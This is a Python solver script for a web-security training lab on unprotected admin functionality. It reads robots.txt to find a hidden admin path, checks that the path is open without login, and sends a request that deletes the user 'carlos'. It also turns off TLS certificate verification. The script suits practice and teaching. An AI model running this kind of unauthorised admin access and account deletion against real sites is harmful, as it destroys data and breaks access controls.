"""
Lab: Unprotected admin functionality

Steps:
1. Enumerate the robots.txt file to identify whether an admin panel is listed and check if it is accessible directly.
2. If accessible, use the admin panel to delete the carlos user account.

Author: D4mn20
"""

import argparse
import re
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help="Target URL (e.g., https://target.com)")
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    url = args.url.rstrip('/')

    print(f"{Fore.BLUE}Starting...{Fore.RESET}")
    session = requests.Session()

    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    # Step 1
    print(f"{Fore.YELLOW}STEP 1:{Fore.RESET} Looking for the admin panel in robots.txt...")
    robots = fetch(session, url, "/robots.txt")

    disallow = re.search(r"Disallow: (.*)", robots.text)
    if not disallow:
        print(f"{Fore.RED}[-] No admin panel found in robots.txt{Fore.RESET}")
        exit(1)

    admin_path = disallow.group(1).strip()
    print(f"{Fore.GREEN}[+] Found admin path: {admin_path}{Fore.RESET}")

    admin = fetch(session, url, admin_path)
    if admin.status_code != 200:
        print(f"{Fore.RED}[-] Admin panel not accessible!{Fore.RESET}")
        exit(1)

    print(f"{Fore.GREEN}[+] Admin panel is accessible!{Fore.RESET}")

    print(f"{Fore.YELLOW}STEP 2:{Fore.RESET} Deleting carlos user...")

    delete = fetch(session, url, f"{admin_path}/delete?username=carlos")
    if delete.status_code == 302:
        print(f"{Fore.GREEN}[+] Successfully deleted carlos user. Lab solved!{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Failed to delete carlos user. Status: {delete.status_code}{Fore.RESET}")
        exit(1)

def fetch(session, url, path):
    full_url = f"{url}{path}"
    try:
        res = session.get(full_url, allow_redirects=False)
        print(f"{Fore.CYAN}[REQUEST]{Fore.RESET} GET {full_url} - Status: {res.status_code}")
        return res
    except Exception as e:
        print(f"{Fore.RED}[-] Failed to fetch {path} due to: {e}{Fore.RESET}")
        exit(1)

if __name__ == "__main__":
    main()
